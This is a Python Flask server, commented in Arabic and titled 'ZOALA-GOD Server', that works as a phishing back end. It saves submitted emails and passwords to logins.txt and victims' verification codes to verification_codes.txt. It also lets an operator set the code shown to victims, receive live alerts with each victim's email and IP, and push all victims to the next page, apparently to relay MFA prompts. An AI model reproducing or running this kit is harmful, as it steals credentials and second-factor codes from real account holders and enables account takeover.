from flask import Flask, request, jsonify
import os
import threading
import time
from datetime import datetime

app = Flask(__name__)

# تخزين الرقم الحالي
current_verification_code = "86"
force_transition = False
user_activity_log = []

@app.route('/')
def index():
    return open('index.html', 'r', encoding='utf-8').read()

@app.route('/get_code')
def get_code():
    return jsonify({"code": current_verification_code})

@app.route('/set_code', methods=['POST'])
def set_code():
    global current_verification_code
    new_code = request.json.get('code')
    
    if new_code and new_code.isdigit() and len(new_code) <= 3:
        current_verification_code = new_code
        print(f"✅ تم تغيير الرقم إلى: {current_verification_code}")
        return jsonify({"status": "success", "code": current_verification_code})
    return jsonify({"status": "error", "message": "رقم غير صالح"})

# ⭐ إضافة endpoint جديد لتسجيل دخول المستخدم لصفحة الرقم
@app.route('/user_entered_phone_page', methods=['POST'])
def user_entered_phone_page():
    try:
        data = request.json
        email = data.get('email', '')
        user_ip = request.remote_addr
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # تسجيل النشاط
        activity = {
            'email': email,
            'ip': user_ip,
            'timestamp': timestamp,
            'page': 'phone_verification'
        }
        user_activity_log.append(activity)
        
        # ⭐ إشعار فوري في الكونسول
        print("\n" + "🔔" * 50)
        print("🔔 مستخدم دخل صفحة الرقم!")
        print("🔔" * 50)
        print(f"📧 البريد: {email}")
        print(f"🌐 IP: {user_ip}")
        print(f"🕐 الوقت: {timestamp}")
        print(f"🔢 الرقم الحالي: {current_verification_code}")
        print("🔔" * 50 + "\n")
        
        return jsonify({"status": "success", "message": "تم تسجيل النشاط"})
    
    except Exception as e:
        print(f"❌ خطأ في تسجيل النشاط: {e}")
        return jsonify({"status": "error", "message": str(e)})

@app.route('/get_activity_log')
def get_activity_log():
    return jsonify({"activity_log": user_activity_log})

@app.route('/force_transition', methods=['POST'])
def force_transition():
    global force_transition
    force_transition = True
    print("🎯 تم تفعيل الانتقال القسري لجميع المستخدمين!")
    return jsonify({"status": "success", "message": "سيتم نقل جميع المستخدمين"})

@app.route('/check_transition')
def check_transition():
    global force_transition
    if force_transition:
        force_transition = False
        return jsonify({"transition": True})
    return jsonify({"transition": False})

@app.route('/poll_code')
def poll_code():
    original_code = request.args.get('current_code', '')
    return jsonify({
        "code": current_verification_code, 
        "changed": current_verification_code != original_code
    })

@app.route('/process_login', methods=['POST'])
def process_login():
    try:
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        
        if email and password:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            user_ip = request.remote_addr
            
            data = f"════════════════════════════════════════\n"
            data += f"📧 البريد: {email}\n"
            data += f"🔑 كلمة المرور: {password}\n"
            data += f"🕐 التاريخ: {timestamp}\n"
            data += f"🌐 IP: {user_ip}\n"
            data += f"════════════════════════════════════════\n\n"
            
            with open('logins.txt', 'a', encoding='utf-8') as f:
                f.write(data)
            
            print(f"📧 تم استلام بيانات: {email}")
            return "SUCCESS"
        return "MISSING_DATA"
    
    except Exception as e:
        print(f"❌ خطأ في حفظ البيانات: {e}")
        return "ERROR"

@app.route('/process_verification', methods=['POST'])
def process_verification():
    try:
        verification_code = request.form.get('verification_code', '')
        email = request.form.get('email', '')
        timestamp = request.form.get('timestamp', '')
        
        if verification_code and email:
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            user_ip = request.remote_addr
            
            data = "════════════════════════════════════════\n"
            data += f"📧 البريد: {email}\n"
            data += f"🔢 رمز التحقق: {verification_code}\n"
            data += f"🕐 وقت الإدخال: {current_time}\n"
            data += f"🕐 الطابع الزمني: {timestamp}\n"
            data += f"🌐 IP: {user_ip}\n"
            data += "════════════════════════════════════════\n\n"
            
            with open('verification_codes.txt', 'a', encoding='utf-8') as f:
                f.write(data)
            
            print(f"🔐 تم استلام كود تحقق: {email} - {verification_code}")
            return "SUCCESS"
        return "MISSING_DATA"
    
    except Exception as e:
        print(f"❌ خطأ في حفظ كود التحقق: {e}")
        return "ERROR"

if __name__ == '__main__':
    # إنشاء الملفات إذا لم تكن موجودة
    for file in ['logins.txt', 'verification_codes.txt']:
        if not os.path.exists(file):
            open(file, 'w').close()
            print(f"📁 تم إنشاء ملف: {file}")
    
    print("=" * 60)
    print("🚀 ZOALA-GOD Server - NOTIFICATION SYSTEM ACTIVE")
    print("=" * 60)
    print("🔔 ستصلك إشعارات عندما يدخل المستخدمون لصفحة الرقم!")
    print("🔧 السيرفر يعمل على: http://localhost:8000")
    print("🎮 استخدم Ctrl+Shift+Z للتحكم")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=8000, debug=False)